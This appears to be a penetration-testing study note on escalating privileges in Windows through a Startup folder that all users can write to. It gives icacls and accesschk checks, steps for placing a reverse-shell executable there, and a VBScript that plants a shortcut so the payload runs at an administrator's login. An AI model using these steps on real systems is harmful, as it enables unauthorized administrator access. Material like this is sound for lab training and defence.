| MASK | PERMISSIONS |  
| ----------- | ----------- |  
| F | Full access |  
| M | Modify access |
| RX | Rad and execute access |  
| R | Read-only access |
| W | Write-only access |

**Detection**  

 Open command prompt and type: 
 
```command prompt - windows 
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

From the output notice that the `BUILTIN\Users` group has full access ‘(F)’ to the directory.

**Exploitation**

[[1._Reverse Shells (WIN)#MSFVenom]]  

Copy the generated file, x.exe, to the Windows target.

Place x.exe in `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`.  

Logoff.  

Login with the administrator account credentials.

Wait for a session to be created, it may take a few seconds.  


#### Malicious file
CreateShortcut.vbs

```command prompt - windows
Set oWS = WScript.CreateObject("WScript.Shell")

sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"

Set oLink = oWS.CreateShortcut(sLinkFile)

oLink.TargetPath = "C:\PrivEsc\reverse.exe"

oLink.Save
```

1. Use accesschk.exe to check permissions on the StartUp directory:

```command prompt - windows
.\accesschk64.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

2. Note that the BUILTIN\Users group has write access to this directory.

3. Create a file CreateShortcut.vbs with the VBScript provided in a previous slide. Change file paths if necessary.

4. Run the script using cscript:

```command prompt - windows
cscript CreateShortcut.vbs
```

5. Start a listener on Kali, then log in as the admin user to trigger the exploit.

![[rlwrap]]